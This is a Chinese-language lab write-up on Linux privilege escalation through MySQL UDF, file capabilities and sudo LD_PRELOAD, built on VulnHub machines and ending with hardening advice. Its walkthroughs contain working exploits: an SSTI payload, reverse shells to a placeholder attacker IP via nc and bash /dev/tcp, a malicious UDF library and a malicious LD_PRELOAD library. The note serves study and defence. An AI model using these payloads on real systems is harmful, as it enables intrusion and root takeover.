@@ -1,0 +1,272 @@
+本文档是一份深入探讨 Linux 系统下权限提升技术的学习笔记，旨在为网络安全研究人员和爱好者提供一份兼具理论与实践的参考资料。内容涵盖了从 Web 应用漏洞获取初始权限，到利用数据库（MySQL UDF）、Linux Capabilities 以及 `LD_PRELOAD` 环境变量等多种高级技术，最终实现从普通用户到 root 用户的完整提权过程。
+
+## 目录
+
+- [Linux 权限提升高级实战笔记：数据库、Capabilities 与 LD_PRELOAD](#linux-权限提升高级实战笔记数据库、capabilities-与-ld_preload)
+  - [目录](#目录)
+  - [一、 概述](#一-概述)
+  - [二、 技术原理](#二-技术原理)
+    - [2.1 MySQL UDF 提权](#21-mysql-udf-提权)
+    - [2.2 Linux Capabilities (能力) 提权](#22-linux-capabilities-能力-提权)
+    - [2.3 LD\_PRELOAD 环境变量劫持提权](#23-ld_preload-环境变量劫持提权)
+  - [三、 环境准备](#三-环境准备)
+  - [四、 实战示例](#四-实战示例)
+    - [4.1 场景一：Web → MySQL UDF 提权 (Raven 2)](#41-场景一web--mysql-udf-提权-raven-2)
+      - [4.1.1 信息收集与 Web 权限获取](#411-信息收集与-web-权限获取)
+      - [4.1.2 利用 MySQL UDF 提权](#412-利用-mysql-udf-提权)
+    - [4.2 场景二：Web → Capabilities 提权 (Hacker Kid)](#42-场景二web--capabilities-提权-hacker-kid)
+      - [4.2.1 获取初始 Shell](#421-获取初始-shell)
+      - [4.2.2 利用 Capabilities 提权](#422-利用-capabilities-提权)
+    - [4.3 场景三：本地用户 → LD\_PRELOAD 提权](#43-场景三本地用户--ld_preload-提权)
+      - [4.3.1 发现可利用的 sudo 规则](#431-发现可利用的-sudo-规则)
+      - [4.3.2 编写并编译恶意动态链接库](#432-编写并编译恶意动态链接库)
+      - [4.3.3 执行提权](#433-执行提权)
+  - [五、 关键细节](#五-关键细节)
+    - [MySQL UDF 的限制](#mysql-udf-的限制)
+    - [Capabilities 的适用性](#capabilities-的适用性)
+    - [LD\_PRELOAD 的前提条件](#ld_preload-的前提条件)
+  - [六、 安全总结](#六-安全总结)
+    - [防御措施](#防御措施)
+    - [核心结论](#核心结论)
+
+## 一、 概述
+
+权限提升是攻击链中至关重要的一环。在获取目标系统的低权限访问（如 www-data 用户或普通用户）后，攻击者需要利用系统配置不当、内核漏洞或服务缺陷来获取 root 权限，从而完全控制系统。本笔记将聚焦于三种在实战中常见且高效的提权向量：
+
+1.  **数据库服务提权**：通过 MySQL 的用户自定义函数 (UDF) 执行任意系统命令。
+2.  **Linux Capabilities**：利用被授予了特殊“能力”的可执行文件绕过常规权限检查。
+3.  **`LD_PRELOAD` 劫持**：当 `sudo` 配置允许保留 `LD_PRELOAD` 环境变量时，通过预加载恶意动态链接库来执行代码。
+
+## 二、 技术原理
+
+### 2.1 MySQL UDF 提权
+
+UDF (User-Defined Function) 是 MySQL 提供的一种扩展接口，允许用户使用 C/C++ 编写自定义函数，并在 SQL 查询中调用。如果攻击者获得了 MySQL 的高权限账户（如 root），并且能够将恶意的动态链接库（`.so` 文件）写入到 MySQL 的插件目录中，就可以创建一个能够执行系统命令的自定义函数，从而将数据库权限提升为操作系统权限。
+
+### 2.2 Linux Capabilities (能力) 提权
+
+Capabilities 是 Linux 内核提供的一种更精细的权限划分机制。它将传统上与 root 用户关联的特权分解为一组独立的“能力”。例如，`cap_net_raw` 允许创建原始套接字，而 `cap_setuid` 允许进程改变其 UID。如果一个可执行文件被管理员错误地授予了危险的 Capabilities（如 `cap_setuid`），普通用户就可以利用这个文件来执行代码并将进程的 UID 设置为 0 (root)，实现提权。
+
+### 2.3 LD_PRELOAD 环境变量劫持提权
+
+`LD_PRELOAD` 是一个 Unix/Linux 系统中的环境变量，它允许用户在程序启动前预先加载指定的动态链接库（`.so` 文件）。如果 `sudo` 配置文件 (`/etc/sudoers`) 中配置了 `env_keep += "LD_PRELOAD"`，意味着普通用户在使用 `sudo` 执行某个命令时，可以保持 `LD_PRELOAD` 变量。攻击者可以构造一个包含恶意代码的 `.so` 文件，并通过 `LD_PRELOAD` 让 `sudo` 执行的程序加载它，从而以 root 权限执行恶意代码。
+
+## 三、 环境准备
+
+本笔记中的示例主要基于以下两个 VulnHub 靶机环境：
+
+- **Raven 2**: [https://www.vulnhub.com/entry/raven-2,269/](https://www.vulnhub.com/entry/raven-2,269/)
+- **Hacker Kid 1.0.1**: [https://www.vulnhub.com/entry/hacker-kid-101,719/](https://www.vulnhub.com/entry/hacker-kid-101,719/)
+
+攻击机环境为 Kali Linux，包含了 `searchsploit`、`gcc`、`netcat` 等常用工具。
+
+## 四、 实战示例
+
+### 4.1 场景一：Web → MySQL UDF 提权 (Raven 2)
+
+此场景模拟从发现 Web 服务漏洞到利用数据库提权的完整流程。
+
+#### 4.1.1 信息收集与 Web 权限获取
+
+1.  **发现敏感目录**：通过目录扫描，发现 `/vendor/` 目录下存在 PHPMailer 组件。
+
+2.  **利用已知漏洞**：使用 `searchsploit` 查找 PHPMailer 的相关漏洞，发现一个远程代码执行漏洞 (Exploit-DB ID: 40974)。
+
+    ```bash
+    searchsploit phpmailer
+    # 找到漏洞利用脚本
+    cp /usr/share/exploitdb/exploits/php/webapps/40974.py p.py
+    ```
+
+3.  **执行漏洞利用脚本**：运行脚本获取 WebShell，获得 `www-data` 用户权限。
+
+    ```bash
+    python p.py http://192.168.139.155/
+    ```
+
+#### 4.1.2 利用 MySQL UDF 提权
+
+1.  **编译恶意 UDF**：在攻击机上，找到用于 UDF 提权的 C 源码 (Exploit-DB ID: 1518)，并将其编译为 `.so` 文件。
+
+    ```bash
+    # 复制源码
+    cp /usr/share/exploitdb/exploits/linux/local/1518.c .
+    # 编译为共享库
+    gcc -g -shared -Wl,-soname,udf.so -o udf.so 1518.c -lc
+    ```
+
+2.  **传输恶意文件**：在攻击机上开启 HTTP 服务，并在目标机器的 WebShell 中下载该 `.so` 文件。
+
+    ```bash
+    # 攻击机
+    python -m http.server 8080
+
+    # 目标机 (WebShell)
+    cd /tmp
+    wget http://<攻击机_IP>:8080/udf.so
+    ```
+
+3.  **连接数据库并导出 UDF**：通过 WebShell 连接本地 MySQL 数据库（通常 Web 应用配置文件中能找到密码），并将 `.so` 文件写入到 MySQL 的插件目录。
+
+    ```sql
+    -- 连接数据库 (密码 R@v3nSecurity 在此靶机中)
+    mysql -uroot -pR@v3nSecurity
+
+    -- 确认插件目录位置
+    show variables like '%plugin%';
+    -- 假设插件目录为 /usr/lib/mysql/plugin/
+
+    -- 使用数据库 `mysql`
+    use mysql;
+
+    -- 创建一个表用于存储二进制文件
+    create table xiaodi(line blob);
+
+    -- 将 .so 文件内容加载到表中
+    insert into xiaodi values(load_file('/tmp/udf.so'));
+
+    -- 将表内容导出为文件到插件目录
+    select * from xiaodi into dumpfile '/usr/lib/mysql/plugin/udf.so';
+    ```
+
+4.  **创建并执行自定义函数**：创建指向 `.so` 文件中函数的自定义函数，并调用它来反弹一个 root shell。
+
+    ```sql
+    -- 创建名为 do_system 的函数
+    create function do_system returns integer soname 'udf.so';
+
+    -- 调用函数执行命令，反弹 shell
+    select do_system('nc <攻击机_IP> 6666 -e /bin/bash');
+    ```
+
+    在攻击机上使用 `nc -lvp 6666` 监听，即可接收到 root 权限的 shell。
+
+### 4.2 场景二：Web → Capabilities 提权 (Hacker Kid)
+
+此场景演示了如何利用被授予特殊“能力”的程序进行提权。
+
+#### 4.2.1 获取初始 Shell
+
+通过对 Web 应用的 SSTI (服务器端模板注入) 漏洞进行利用，获取反弹 shell。
+
+```bash
+# 构造 Payload
+{% import os %}{{os.system('bash -c "bash -i &> /dev/tcp/<攻击机_IP>/6688 0>&1"')}}
+
+# URL 编码后访问
+http://192.168.10.142:9999/?name=%7B%25+import+os+%25%7D%7B%7Bos%2Esystem%28%27bash+%2Dc+%22bash+%2Di+%26%3E+%2Fdev%2Ftcp%2F<攻击机_IP>%2F6688+0%3E%261%22%27%29%7D%7D
+```
+
+#### 4.2.2 利用 Capabilities 提权
+
+1.  **扫描系统中的 Capabilities**：在获取的 shell 中，使用 `getcap` 命令递归扫描文件系统，查找被设置了特殊能力的文件。
+
+    ```bash
+    /sbin/getcap -r / 2>/dev/null
+    ```
+
+    假设扫描结果显示 `/usr/bin/python2.7` 被设置了 `cap_setuid+ep` 能力。
+
+2.  **利用 `cap_setuid` 能力**：`cap_setuid` 允许进程修改其 UID。我们可以利用 `python` 执行一小段代码，调用 `posix_setuid(0)` 将当前进程的用户 ID 设置为 0 (root)，然后生成一个 shell。
+
+    ```python
+    # 在目标机上执行
+    /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+    ```
+
+    执行后，当前 shell 的权限将提升为 root。
+
+### 4.3 场景三：本地用户 → LD_PRELOAD 提权
+
+此场景展示了当 `sudo` 配置不当时，如何通过 `LD_PRELOAD` 实现提权。
+
+#### 4.3.1 发现可利用的 sudo 规则
+
+1.  **检查 sudo 权限**：使用 `sudo -l` 命令查看当前用户可以免密执行的 `sudo` 命令。
+
+    ```bash
+    sudo -l
+    ```
+
+2.  **分析 sudoers 配置**：输出结果显示用户 `test` 可以免密执行 `/usr/bin/find`，并且 `env_keep` 选项中包含了 `LD_PRELOAD`。
+
+    ```
+    User test may run the following commands on this host:
+        (ALL : ALL) NOPASSWD: /usr/bin/find
+    Matching Defaults entries for test on this host:
+        env_reset, ..., env_keep+=LD_PRELOAD
+    ```
+
+    这个配置是提权的关键。
+
+#### 4.3.2 编写并编译恶意动态链接库
+
+1.  **编写 C 源码 (`shell.c`)**：创建一个 C 文件，其中包含一个 `_init` 函数。这个函数会在库被加载时自动执行。
+
+    ```c
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <stdlib.h>
+
+    // _init 函数会在库加载时自动执行
+    void _init() {
+        unsetenv("LD_PRELOAD"); // 清理环境变量，避免后续命令受影响
+        setgid(0);              // 设置组 ID 为 root
+        setuid(0);              // 设置用户 ID 为 root
+        system("/bin/sh");      // 启动一个 shell
+    }
+    ```
+
+2.  **编译为共享库 (`.so`)**：使用 `gcc` 将其编译为动态链接库。
+
+    ```bash
+    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+    ```
+
+    将生成的 `shell.so` 文件上传到目标服务器的 `/tmp` 目录。
+
+#### 4.3.3 执行提权
+
+在目标服务器上，使用 `sudo` 执行 `find` 命令，同时通过 `LD_PRELOAD` 环境变量指定加载我们的恶意 `shell.so` 文件。
+
+```bash
+sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
+```
+
+当 `find` 命令即将被执行时，系统会首先加载 `/tmp/shell.so`，`_init` 函数被触发，以 root 权限执行 `system("/bin/sh")`，从而直接为我们提供一个 root shell。
+
+## 五、 关键细节
+
+- ### MySQL UDF 的限制
+  - 需要有写入 MySQL 插件目录的权限 (`plugin_dir`)。
+  - 需要有 `FILE` 权限才能使用 `load_file()` 和 `into dumpfile`。
+  - MySQL 版本对 UDF 的支持有所不同，较新版本可能有更多安全限制。
+
+- ### Capabilities 的适用性
+  - 并非所有程序都支持 Capabilities。
+  - 提权成功与否取决于被授予的具体“能力”。`cap_setuid`、`cap_sys_admin` 等是高危能力。
+  - 这是一个相对较新的提权向量，容易被系统管理员忽略。
+
+- ### LD_PRELOAD 的前提条件
+  - `sudo` 配置中必须包含 `env_keep += "LD_PRELOAD"`。
+  - 需要有一个可以用 `sudo` 执行的程序，无论这个程序本身功能是什么。
+
+## 六、 安全总结
+
+### 防御措施
+
+- **最小权限原则**：为数据库账户、系统服务和用户分配完成任务所需的最小权限。
+- **安全配置**：
+  - 禁用或严格限制 MySQL 的 `FILE` 权限，确保 `plugin_dir` 目录不可写。
+  - 谨慎使用 `setcap`，避免为不必要的程序授予高危 Capabilities。
+  - 在 `sudoers` 配置中移除 `LD_PRELOAD` from `env_keep`，这是默认的安全配置。
+- **定期审计**：定期扫描系统文件权限、Capabilities 设置和 `sudo` 规则，发现潜在的配置风险。
+- **应用加固**：及时修复 Web 应用及其组件的已知漏洞，防止攻击者获取初始立足点。
+
+### 核心结论
+
+- **提权路径多样化**：Linux 系统的复杂性为权限提升提供了多种途径，防御者需要进行纵深防御。
+- **配置大于漏洞**：许多高危的提权问题源于不安全的系统配置，而非软件本身的漏洞。
+- **知识串联是关键**：成功的提权往往需要将 Web 渗透、数据库知识和 Linux 系统特性结合起来，形成完整的攻击链。
+
+---
